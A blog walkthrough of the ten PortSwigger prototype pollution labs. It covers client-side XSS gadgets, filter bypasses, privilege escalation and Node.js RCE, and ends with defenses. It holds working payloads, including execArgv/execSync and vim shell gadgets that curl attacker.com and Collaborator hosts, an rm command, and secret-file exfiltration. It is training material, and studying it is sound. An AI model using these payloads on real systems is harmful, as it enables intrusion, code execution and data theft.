---
title: Walkthrough - Prototype Pollution Portswigger labs
date: 2026-03-24 12:30:00 + 05:30
categories: [Web, BSCP]
tags: [bscp]
description: An intro to Prototype Pollution vulnerabilities and walkthrough of all 10 portswigger labs
---

Completed all 10 Prototype Pollution labs from Portswigger. Prototype pollution is a JavaScript-specific vulnerability that abuses the language's prototype inheritance model—every object in JavaScript inherits properties from its prototype chain, and if an attacker can inject properties into `Object.prototype`, those properties become accessible on every object in the application. These labs covered both client-side and server-side variants: client-side attacks exploited polluted properties reaching dangerous sinks like `script src` and `eval()`, bypassed sanitization filters with recursive keyword obfuscation, and abused third-party libraries. Server-side attacks escalated privileges by polluting `isAdmin`, detected pollution without reflection using status code overrides and JSON spacing tricks, bypassed server-side filters, and ultimately achieved remote code execution by polluting Node.js `execArgv` and `shell` properties to run arbitrary OS commands. Below is a detailed explanation of prototype pollution vulnerabilities followed by step-by-step walkthroughs for each lab.

## Everything about Prototype Pollution

##### 1. What is Prototype Pollution?

JavaScript uses a prototype-based inheritance model. Every object has an internal `[[Prototype]]` link, and when you access a property on an object, JavaScript walks up the chain until it finds it or reaches `null`.

```javascript
const obj = {};
obj.toString(); // works — inherited from Object.prototype
```

The key property for attacks is `__proto__`, which is a publicly accessible reference to an object's prototype. Setting a property on `__proto__` sets it on the prototype itself — and since all objects share `Object.prototype` at the top of the chain, polluting it affects every object in the runtime:

```javascript
const obj = {};
obj.__proto__.isAdmin = true;

const other = {};
console.log(other.isAdmin); // true — pollution is global
```

This is prototype pollution: injecting arbitrary properties into `Object.prototype` (or another shared prototype) so that all subsequently created objects inherit those properties.

##### 2. Sources of Prototype Pollution

A source is any input that reaches a property assignment operation without sanitization. Common sources include:

**URL query parameters:**
```
/?__proto__[foo]=bar
/?__proto__.foo=bar
/?constructor[prototype][foo]=bar
```

**JSON body (server-side):**
```json
{
  "__proto__": {
    "foo": "bar"
  }
}
```

**Recursive merge operations** — functions that deep-merge user-supplied objects into application objects are a classic source. If the merge function doesn't block `__proto__` or `constructor`, it will happily write attacker-controlled properties onto the prototype.

##### 3. Sinks: Where Pollution Becomes Exploitation

A sink is where the polluted property gets used in a dangerous way. On the client side:

| Sink | How Pollution Reaches It | Impact |
|---|---|---|
| `script.src = config.transport_url` | Pollute `transport_url` with a `data:` URL | XSS via script injection |
| `eval(manager.sequence)` | Pollute `sequence` with JS code | Arbitrary JS execution |
| `innerHTML = value` | Pollute any property read into innerHTML | DOM XSS |
| Third-party library gadgets | Library reads prototype property for config | XSS, open redirect |

On the server side (Node.js):

| Sink | Polluted Property | Impact |
|---|---|---|
| `child_process.spawn()` | `shell`, `execArgv` | Remote code execution |
| JSON serialization spacing | `json spaces` | Detection / information |
| HTTP status code | `status`, `statusCode` | Detection / DoS |
| Authorization checks | `isAdmin`, `admin` | Privilege escalation |

##### 4. Client-Side Detection

The most direct method is via the URL:

```
/?__proto__[testprop]=testval
```

Then check in the browser console:
```javascript
Object.prototype // look for testprop: "testval"
```

If the property appears, the application is parsing the query string into a nested object structure without sanitizing `__proto__`.

DOM Invader (built into Burp's browser) automates this: it injects canary values through all sources, monitors all sinks, and maps which source-sink pairs are exploitable — often finding gadgets that manual analysis would miss.

##### 5. Server-Side Detection

Server-side pollution is harder to confirm because:
- The server doesn't reflect `Object.prototype` back in responses
- You can't run `Object.prototype` in a browser console to check

**Indirect detection techniques:**

*JSON spacing trick* — Node.js's `JSON.stringify` reads `json spaces` from the options object, which inherits from `Object.prototype`. Polluting it changes the whitespace formatting of every JSON response:
```json
"__proto__": { "json spaces": 10 }
```
Compare the raw response before and after — if indentation changes, prototype pollution is confirmed.

*Status code override* — Polluting `status` or `statusCode` overrides HTTP response codes, which can be observed even when no property values are reflected:
```json
"__proto__": { "status": 555 }
```

##### 6. Bypassing Sanitization Filters

Applications that try to block prototype pollution often use blacklists, checking for `__proto__` in input keys. These are typically bypassable:

**Non-recursive filter bypass:**
```
/?__pro__proto__to__[foo]=bar
```
The filter strips `__proto__` once, leaving `__proto__` behind. If the filter only runs once rather than recursively, this gets through.

**Alternative prototype access:**
```
/?constructor[prototype][foo]=bar
```
Every function has a `constructor` property, and `constructor.prototype` is the same object as `__proto__`. Filters that only block `__proto__` miss this entirely.

##### 7. Server-Side RCE via Node.js Gadgets

The most impactful server-side prototype pollution sinks are in Node.js's `child_process` module. When `child_process.spawn()` is called to run a maintenance task or job:

**`execArgv` gadget** — injects Node.js CLI arguments into spawned child processes:
```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('id')"
  ]
}
```

**`shell` + `input` gadget** — overrides the shell used by child processes and pipes a command through stdin:
```json
"__proto__": {
  "shell": "vim",
  "input": ":! curl https://attacker.com\n"
}
```

Both gadgets require something server-side to actually spawn a child process after the pollution is set — typically triggered by a feature like "run maintenance jobs."

## Labs

### 1. Client-side prototype pollution via browser APIs

Description:

We need to exploit client side prototype pollution and execute an `alert()` popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320223549.png)

Explanation:

We will try to manually detect prototype pollution from the URL by adding `/?__proto__[foo]=bar`. We can see that when we type `Object.prototype` in the browser console, we are able to see `foo:bar`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320223528.png)

We see that the `transport_url` property is defined and it is set to false for both configurable and writeable. However, it doesn't have a defined `value` property.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320224201.png)

We can see that we are able to inject an arbitrary value using - `/?__proto__[value]=foo`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320224609.png)

We can see that the value we inject is getting reflected in the webpage within script tags.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320224821.png)

We can exploit this behavior to trigger the `alert(1)` popup by using - `/?__proto__[value]=data:,alert(1);`. 

![](/assets/images/PrototypePollution/Pasted%20image%2020260320224907.png)

### 2. DOM XSS via client-side prototype pollution

Description:

We need to exploit DOM based XSS and execute the `alert(1)` popup by abusing prototype pollution.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320163855.png)

Explanation:

To solve this lab via DOM invader, we must enable it with prototype pollution. We will be able to see sources and sinks in DOM Invader.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164758.png)

We will click on scan for gadgets after it detects sources.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164827.png)

It does find sinks.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164837.png)

We will click on exploit.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164919.png)

This execute the alert popup on its own.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164932.png)

This solved the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320164942.png)

To manually solve the lab, we first confirm prototype pollution via `/?__proto__[foo]=bar`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320174830.png)

We can see in the `searchLogger.js` file that `transport_url` is an undefined property for the config object.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320174952.png)

When we try `/?__proto__[transport_url]=bar`, we can see the `bar` being reflected in the script tags.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320175033.png)

Exploiting prototype pollution with `/?__proto__[transport_url]=data:,alert(1);`, solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320175054.png)

### 3. DOM XSS via an alternative prototype pollution vector

Description:

We need to again execute the alert popup via prototype pollution.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170400.png)

Explanation:

We can again use DOM Invader to search for gadgets once it detects potential sources.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170608.png)

It will run the search in a new window.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170649.png)

It is successful in finding a sink.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170706.png)

We will click on exploit.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170739.png)

We do not see a popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170753.png)

Opening the console, we see that the payload is invalid and we need to make it run.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171507.png)

We will paste it in the console and see the syntax error. Adding a `-` at the end fixes this (This itself will solve the lab).

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171727.png)

We will add it in the URL.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171001.png)

We see the popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320170947.png)

This solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171020.png)

To manually solve the lab we first try to detect prototype pollution. `/?__proto__[foo]=bar` doesn't work.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320221737.png)

`/?__proto__.foo=bar` works.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320221812.png)

In the `searchLoggerAlternative.js` file, we see manager object has an undeclared property which is going in the `eval()` function.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320221838.png)

Trying  1. `/?__proto__.sequence=alert(1)` fails. We click on the error's line which leads us to the line with the `eval()` function.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320221928.png)

We will add a breakpoint here and reload the page with the payload. We can see that it has `alert(1)1`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222059.png)

Again visible in the VM215 window.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222239.png)

We add the `-` in between `alert(1)` and the `1`. This gives the popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222259.png)

### 4. Client-side prototype pollution via flawed sanitization

Description:

We need to again make the `alert(1)` popup execute.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171824.png)

Explanation:

To solve with DOM Invader, we will first run a random search (because DOM Invader didn't show anything first time around). We can for sinks.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320171910.png)

We find a sink, we click exploit.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320172012.png)

This gives us the popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320172037.png)

This solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320172048.png)

To solve the lab manually, we first detect prototype pollution using, `/?__proto__.foo=bar`. This doesn't work.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320172556.png)

`/?__pro__proto__to__.[foo]=bar` works.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320172645.png)

The `searchLoggerFiltered.js` is filtering certain keywords using a blacklist that are bad properties. In the previous step, we bypassed this as the checking is not done recursively. Also, `transport_url` property is not defined.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320173739.png)

`/?__pro__proto__to__.[transport_url]=foo` works.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320173829.png)

foo is getting reflected in the script tags.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320173903.png)

`/?__pro__proto__to__[transport_url]=data:,alert(1);` gives us the popup and solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320174348.png)

### 5. Client-side prototype pollution in third-party libraries

Description:

We need to execute `alert(document.cookie)` popup in the victim's browser to solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320224747.png)

Explanation:

We will first scan for sinks using DOM Invader.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222633.png)

It will run the search in another tab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222659.png)

DOM Invader found a sink.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222716.png)

We click on exploit.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222912.png)

This gives us the popup.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320222928.png)

We will now send this URL to the victim in script tags via exploit server. We change the `alert(1)` to `alert(document.cookie)`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320223045.png)

This solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320223102.png)

### 6. Privilege escalation via server-side prototype pollution

Description:

We need to abuse prototype pollution to access the admin panel and delete the user `carlos`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225001.png)

Explanation:

We login with our given credentials.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225203.png)

We send the change address request to repeater. `isAdmin` property is returned as `false`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225246.png)

We will use this payload to check for prototype pollution.

```JSON
"__proto__": { 
	"foo":"bar" 
}
```

We see the property `"foo":"bar"` in return.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225759.png)

Now we will use:

```JSON
"__proto__": { 
	"isAdmin":true 
}
```

This sets `isAdmin` to `true`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225823.png)

When we reload the page, we will see the admin panel.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225837.png)

Deleting the user `carlos` will solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225855.png)

### 7. Detecting server-side prototype pollution without polluted property reflection

Description:

In this lab, we must pollute the prototype but the polluted property is not reflected back. Also the lab says that a non-destructive change must be triggered to solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320225941.png)

Explanation:

We will send the change address request to repeater.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320230203.png)

When we try to confirm prototype pollution via the JSON payload, it doesn't work.

```JSON
"__proto__":{
	"foo":"bar"
}
```

![](/assets/images/PrototypePollution/Pasted%20image%2020260320230246.png)

When we try to send a malformed JSON payload, it triggers an error. 

![](/assets/images/PrototypePollution/Pasted%20image%2020260320230339.png)

Now we will try to pollute the `status` property.

```JSON
"__proto__":{
	"status":"420"
}
```

We do not really see any reflection in response.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320230602.png)

When we send a malformed payload again we now see that the `status` is `500`. This somehow solved the lab for me but it should have reflected `500` as the `status` and `statusCode`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231020.png)

### 8. Bypassing flawed input filters for server-side prototype pollution

Description:

We need to escalate privileges and delete the user `carlos` to solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231126.png)

Explanation:

We will send the change address request to repeater.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231251.png)

We will send this payload to detect prototype pollution.

```JSON
"__proto__":{
	"json spaces":10
}
```

Before we send it, we can see how the response looks in the raw tab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231405.png)

Sending this, shows us the response with spaces in the raw tab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231425.png)

We will now try to escalate privileges using this payload.

```JSON
"__proto__":{
	"admin":true
}
```

We can see that `isAdmin` is now set to `true`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231554.png)

We can now access the admin panel and deleting the user `carlos` will solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231612.png)

### 9. Remote code execution via server-side prototype pollution

Description:

We need to exploit prototype pollution to trigger a remote code execution and delete the file `/home/carlose/morale.txt` to solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231716.png)

Explanation:

We will send the change address to repeater. We can see that we are already admin as the `isAdmin` is set to `true`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231915.png)

We can see that we have an admin panel. We can run maintenance jobs.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320231933.png)

We will run the maintenance jobs and see that it is sending a POST request to `/admin/jobs`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232002.png)

Now we will try to detect prototype pollution. In raw tab, we can see that the response is without any spaces.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232030.png)

When we send this payload:

```JSON
"__proto__": { 
	"json spaces":10
}
```

we can see the response now has spaces.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232056.png)

Now we will send this payload to see if we can get an RCE and get pings back on our collaborator.

```JSON
"__proto__": { 
	"execArgv":[ 
		"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" 
	] 
}
```

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232147.png)

After sending the request, we need to click the Run maintenance jobs button.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232217.png)

We will now get the pings on collaborator.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232232.png)

Now we will send this payload to delete the `morale.txt` file in `carlos`'s home directory.

```JSON
"__proto__": { 
	"execArgv":[ 
		"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" 
	] 
}
```

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232343.png)

Clicking on Run maintenance jobs will trigger the RCE, delete the `morale.txt` file in `carlos`'s home directory and solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232404.png)

### 10. Exfiltrating sensitive data via server-side prototype pollution

Description: 

We need to exploit prototype pollution and read and submit the contents on a secret file in the `/home/carlos` directory to solve the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232446.png)

Explanation:

We will send the change address request to repeater.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232807.png)

There is an admin panel that is able to run maintenance jobs. We will run those too just for now.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232823.png)

We will now use the change address request to exploit prototype pollution. We can see that there is no spacing in the JSON response in the raw response tab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320232939.png)

We use this payload to confirm the prototype pollution.

```JSON
"__proto__":{
	"json spaces":10
}
```

We can see the difference in the raw response.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233005.png)

Using the payload:

```JSON
"__proto__": { 
	"shell":"vim", 
	"input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n" 
}
```

We will try to get a response on the collaborator. For that we will click on `run maintenance jobs` to trigger the RCE.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233121.png)

We see the pingbacks on collaborator.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233151.png)

Now we will try to send the contents of `/home/carlos` to collaborator. We will click on `run maintenance jobs` to trigger the RCE.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233339.png)

We get a base64 encoded response.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233448.png)

We see that the response says `node_apps` and `secret`.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233510.png)

Now we try to send the contents of the `secret` file to collaborator. We will click on `run maintenance jobs` to trigger the RCE again.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233612.png)

Now we will see the base64 encoded response.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233704.png)

We will submitted the base64 decoded string.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233738.png)

This solves the lab.

![](/assets/images/PrototypePollution/Pasted%20image%2020260320233750.png)



## Conclusion

These 10 labs demonstrated prototype pollution across the full exploitation spectrum — from client-side XSS gadgets to server-side remote code execution. Key takeaways include:

- `__proto__` Is Not Just a Curiosity: Any application that parses user input into nested objects without filtering `__proto__` is vulnerable — URL query strings, JSON bodies, and deep merge functions are all common entry points
- Pollution is Global by Definition: Setting a property on `Object.prototype` affects every object created after that point in the same runtime — a single polluted property can change application-wide behavior
- Sinks Are Everywhere in JavaScript: Properties read from objects without existence checks — `config.transport_url`, `manager.sequence`, authorization flags — all become dangerous when they can be seeded from the prototype chain
- DOM Invader Dramatically Accelerates Discovery: Manually identifying which source-sink pairs are exploitable across large codebases is tedious; DOM Invader's gadget scanning reduces this to seconds, especially for third-party library gadgets you wouldn't find by reading application code
- Sanitization Filters Are Usually Shallow: Blacklists that strip `__proto__` once and don't check `constructor.prototype` provide false security — bypasses like `__pro__proto__to__` exploit the non-recursive nature of most filter implementations
- Server-Side Pollution Has No Visual Feedback: Unlike client-side attacks where you can inspect `Object.prototype` in DevTools, server-side confirmation requires indirect techniques — JSON spacing changes and status code overrides are reliable non-destructive indicators
- RCE via `execArgv` Is a High-Value Gadget: Node.js's argument injection through `child_process.spawn()` requires no memory corruption or CVE — it's pure logic abuse of the prototype chain, and it achieves full OS command execution with a single JSON payload
- The `shell` + `input` Chain Is Versatile: Using `vim` as a shell with stdin piped through `input` is a creative exploitation path that bypasses environments where `execArgv` alone might not trigger

The split between client-side (Labs 1–5) and server-side (Labs 6–10) reflected two fundamentally different threat models. Client-side pollution targets other users — the attacker poisons the JavaScript environment to execute payloads in victims' browsers, with cookie theft and session hijacking as the end goal. Server-side pollution targets the application itself — the attacker modifies the Node.js runtime to escalate privileges or execute system commands, with data exfiltration and full server compromise as the end goal.

The RCE labs (9 and 10) were the most technically satisfying. Lab 9 used `execArgv` to inject `--eval` into spawned Node processes — a gadget that works because `child_process.spawn()` passes `process.execArgv` to child processes by default, and prototype pollution seeds it before the spawn happens. Lab 10 used the `shell` + `input` combination to pipe commands through `vim`'s ex mode, which is a useful alternative when the `execArgv` path is unavailable. Both required a two-step trigger: first pollute the prototype via the address change endpoint, then pull the trigger by running the maintenance job.

The detection-without-reflection lab (Lab 7) was a good reminder that prototype pollution confirmation doesn't require a property echo. The JSON spacing trick is particularly elegant because it has zero destructive side effects — it simply changes whitespace formatting — making it safe to use against production systems during authorized testing.

Prototype pollution is ultimately a language design consequence. JavaScript's mutable prototype chain, combined with the ubiquity of recursive object merge operations and the habit of reading configuration from plain objects without hasOwnProperty checks, creates the conditions for this vulnerability class. The defenses are well-understood: freeze `Object.prototype` with `Object.freeze()`, use `Object.create(null)` for property maps, validate all keys against a whitelist before assignment, and prefer `structuredClone()` or schema-validated merge operations over generic deep merge utilities.
